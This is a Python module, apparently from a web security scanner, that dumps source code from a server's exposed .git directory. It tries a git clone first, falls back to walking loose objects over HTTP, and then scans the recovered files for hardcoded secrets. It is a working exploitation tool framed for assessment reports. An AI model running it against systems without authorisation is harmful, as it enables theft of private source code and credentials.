"""
git_dumper.py - full source reconstruction for a confirmed-exposed .git
directory.

Plain-language: check_git_exposure() in detective.py only confirms that
a target's .git directory is publicly readable - a strong "Exposed
Source Control" finding on its own. This module goes one step further:
it actually recovers the source code, which turns "the .git folder is
exposed" into "here is the app's actual source, including anything
sensitive committed to history" - a much stronger, better-evidenced
report, and often the fastest path to finding hardcoded secrets that
were later removed from the live app but never scrubbed from git history.

Primary strategy: git itself already knows how to do this correctly.
When a server has no real git backend (just plain static files under
/.git/), a normal `git clone <url>/.git dest` transparently falls back
to git's own "dumb HTTP" transport, which walks refs -> commits ->
trees -> blobs over plain HTTP GETs and handles both loose objects and
packfiles correctly. We just call it - reimplementing git's own
object/pack parsing from scratch would be slower to build and more
likely to be subtly wrong than reusing git.

Fallback strategy: if the dumb-HTTP clone fails (some misconfigured
setups break git's own auto-detection), we do a best-effort manual walk
of loose objects only - starting at HEAD/refs, decompressing commit and
tree objects to discover more object hashes, and reconstructing
whatever's reachable that way. This fallback CANNOT recover objects
that only exist inside a packfile (a git gc'd repository) - that
limitation is intentional rather than silently pretending completeness,
and is called out clearly in the result so a report never overclaims.
"""

import logging
import os
import re
import zlib
from dataclasses import dataclass, field

import httpx

from . import tools
from .detective import _HARDCODED_SECRET_PATTERNS  # reuse existing patterns, don't duplicate

logger = logging.getLogger("swas.git_dumper")

_TIMEOUT = httpx.Timeout(10.0, connect=5.0)
_MAX_FALLBACK_OBJECTS = 500  # hard cap so a huge repo can't hang the fallback walk forever

_DUMPS_ROOT = os.environ.get("GIT_DUMP_DIR", "/data/scans/git_dumps")


@dataclass
class GitDumpResult:
    success: bool
    method: str  # "git_clone" | "manual_fallback" | "failed"
    dump_path: str | None = None
    file_count: int = 0
    sample_files: list[str] = field(default_factory=list)
    secret_candidates: list[str] = field(default_factory=list)
    note: str = ""


def _safe_dir_for(project_id: int, target_id: int) -> str:
    path = os.path.join(_DUMPS_ROOT, str(project_id), str(target_id))
    os.makedirs(path, exist_ok=True)
    return path


async def _try_git_clone(git_url: str, dest: str) -> bool:
    """
    Lets the real git binary do the work via its own dumb-HTTP fallback.
    Returns True only if the clone produced a non-empty working tree -
    git sometimes exits 0 with an empty/broken checkout against a
    partially-exposed directory, so success is verified by content, not
    just exit code.
    """
    result = await tools.run_tool(
        "git",
        ["git", "clone", "--quiet", git_url, dest],
        timeout_seconds=600,
    )
    if not result.success:
        logger.info(
            "git_dumper: native git clone failed for %s: %s",
            git_url, result.error or result.stderr[:300],
        )
        return False
    has_files = any(
        ".git" not in root.split(os.sep) and files
        for root, _, files in os.walk(dest)
    )
    return has_files


def _decompress_object(raw: bytes) -> tuple[str, bytes] | None:
    """Git loose objects are zlib-compressed 'type size\\0content'."""
    try:
        data = zlib.decompress(raw)
    except zlib.error:
        return None
    null_idx = data.find(b"\x00")
    if null_idx == -1:
        return None
    header = data[:null_idx].decode(errors="replace")
    parts = header.split(" ")
    if len(parts) != 2:
        return None
    return parts[0], data[null_idx + 1:]


def _parse_tree_object(content: bytes) -> list[tuple[str, str, str]]:
    """
    Parses a git tree object into (mode, name, sha1_hex) tuples. Tree
    entries are binary: '<mode> <name>\\0<20-byte-sha1>' repeated.
    """
    entries = []
    pos = 0
    while pos < len(content):
        space_idx = content.index(b" ", pos)
        mode = content[pos:space_idx].decode()
        null_idx = content.index(b"\x00", space_idx)
        name = content[space_idx + 1:null_idx].decode(errors="replace")
        sha1_hex = content[null_idx + 1:null_idx + 21].hex()
        entries.append((mode, name, sha1_hex))
        pos = null_idx + 21
    return entries


async def _fetch_object(client: httpx.AsyncClient, base: str, sha1: str) -> bytes | None:
    url = f"{base}/.git/objects/{sha1[:2]}/{sha1[2:]}"
    try:
        resp = await client.get(url)
    except httpx.HTTPError:
        return None
    if resp.status_code != 200 or len(resp.content) < 4:
        return None
    return resp.content


async def _resolve_head_commit(client: httpx.AsyncClient, base: str) -> str | None:
    head_resp = await client.get(f"{base}/.git/HEAD")
    if head_resp.status_code != 200:
        return None
    head_content = head_resp.text.strip()

    if re.fullmatch(r"[0-9a-f]{40}", head_content):
        return head_content  # detached HEAD

    if not head_content.startswith("ref:"):
        return None

    ref_path = head_content.split(" ", 1)[1].strip()
    ref_resp = await client.get(f"{base}/.git/{ref_path}")
    if ref_resp.status_code == 200 and re.fullmatch(r"[0-9a-f]{40}", ref_resp.text.strip()):
        return ref_resp.text.strip()

    # Ref file itself 404s if refs are packed - fall back to packed-refs.
    packed_resp = await client.get(f"{base}/.git/packed-refs")
    if packed_resp.status_code == 200:
        for line in packed_resp.text.splitlines():
            if line.endswith(ref_path):
                return line.split(" ")[0].strip()
    return None


async def _manual_fallback_walk(host: str, dest: str) -> GitDumpResult:
    """
    Best-effort reconstruction of the latest reachable commit's file
    tree using only loose objects. Does not recover objects that live
    only inside a packfile (see module docstring).
    """
    base = host.rstrip("/")
    os.makedirs(dest, exist_ok=True)

    async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
        commit_sha = await _resolve_head_commit(client, base)
        if not commit_sha:
            return GitDumpResult(success=False, method="failed", note="Could not resolve HEAD to a commit hash")

        seen: set[str] = set()
        commit_queue = [commit_sha]
        tree_queue: list[tuple[str, str]] = []  # (sha1, relative_dir)
        objects_fetched = 0

        while commit_queue and objects_fetched < _MAX_FALLBACK_OBJECTS:
            sha1 = commit_queue.pop(0)
            if sha1 in seen:
                continue
            seen.add(sha1)

            raw = await _fetch_object(client, base, sha1)
            parsed = _decompress_object(raw) if raw else None
            if parsed is None or parsed[0] != "commit":
                continue
            objects_fetched += 1

            text = parsed[1].decode(errors="replace")
            tree_match = re.search(r"^tree ([0-9a-f]{40})", text, re.MULTILINE)
            if tree_match:
                tree_queue.append((tree_match.group(1), ""))
            for parent_match in re.finditer(r"^parent ([0-9a-f]{40})", text, re.MULTILINE):
                commit_queue.append(parent_match.group(1))

        recovered_files: list[str] = []
        while tree_queue and objects_fetched < _MAX_FALLBACK_OBJECTS:
            tree_sha, rel_dir = tree_queue.pop(0)
            if tree_sha in seen:
                continue
            seen.add(tree_sha)

            raw = await _fetch_object(client, base, tree_sha)
            parsed = _decompress_object(raw) if raw else None
            if parsed is None or parsed[0] != "tree":
                continue
            objects_fetched += 1

            for mode, name, entry_sha in _parse_tree_object(parsed[1]):
                entry_rel = os.path.join(rel_dir, name)
                if mode.startswith("040"):  # subtree (directory)
                    tree_queue.append((entry_sha, entry_rel))
                    continue
                if entry_sha in seen or objects_fetched >= _MAX_FALLBACK_OBJECTS:
                    continue
                seen.add(entry_sha)

                blob_raw = await _fetch_object(client, base, entry_sha)
                blob_parsed = _decompress_object(blob_raw) if blob_raw else None
                if blob_parsed is None or blob_parsed[0] != "blob":
                    continue
                objects_fetched += 1

                out_path = os.path.join(dest, entry_rel)
                try:
                    os.makedirs(os.path.dirname(out_path), exist_ok=True)
                    with open(out_path, "wb") as f:
                        f.write(blob_parsed[1])
                    recovered_files.append(entry_rel)
                except OSError:
                    continue

    if not recovered_files:
        return GitDumpResult(success=False, method="failed", note="No files recovered via loose-object walk")

    return GitDumpResult(
        success=True,
        method="manual_fallback",
        dump_path=dest,
        file_count=len(recovered_files),
        sample_files=recovered_files[:20],
        note=(
            f"Best-effort recovery: {len(recovered_files)} file(s) from the latest commit's tree "
            f"only, via loose objects. Objects that exist solely inside a packfile were NOT "
            f"recovered - if this looks incomplete, that is why."
        ),
    )


def _scan_for_secret_candidates(dump_dir: str, sample_files: list[str]) -> list[str]:
    """Reuses detective.py's existing secret-pattern list against the
    recovered files - no point maintaining a second pattern list."""
    hits = []
    for rel_path in sample_files:
        full_path = os.path.join(dump_dir, rel_path)
        try:
            with open(full_path, "r", errors="ignore") as f:
                content = f.read(20000)
        except OSError:
            continue
        for pattern in _HARDCODED_SECRET_PATTERNS:
            match = pattern.search(content)
            if match:
                hits.append(f"{rel_path}: {match.group(0)[:80]}")
                break
        if len(hits) >= 10:
            break
    return hits


async def dump_git_repository(host: str, project_id: int, target_id: int) -> GitDumpResult:
    """
    Entry point - call ONLY after detective.check_git_exposure() has
    already confirmed .git/HEAD is publicly readable. This does real
    reconstruction work and real disk I/O, so it's gated behind a
    confirmed-exposure signal rather than run speculatively on every host.
    """
    dest = _safe_dir_for(project_id, target_id)
    git_url = host.rstrip("/") + "/.git"

    cloned = await _try_git_clone(git_url, dest)
    if cloned:
        all_files = [
            os.path.relpath(os.path.join(root, f), dest)
            for root, _, files in os.walk(dest)
            if ".git" not in root.split(os.sep)
            for f in files
        ]
        return GitDumpResult(
            success=True,
            method="git_clone",
            dump_path=dest,
            file_count=len(all_files),
            sample_files=all_files[:20],
            secret_candidates=_scan_for_secret_candidates(dest, all_files),
            note="Full clone via git's native dumb-HTTP transport - complete history recovered, not just the latest tree.",
        )

    logger.info("git_dumper: native clone failed for %s, trying manual loose-object fallback", host)
    result = await _manual_fallback_walk(host, dest)
    if result.success:
        result.secret_candidates = _scan_for_secret_candidates(dest, result.sample_files)
    return result
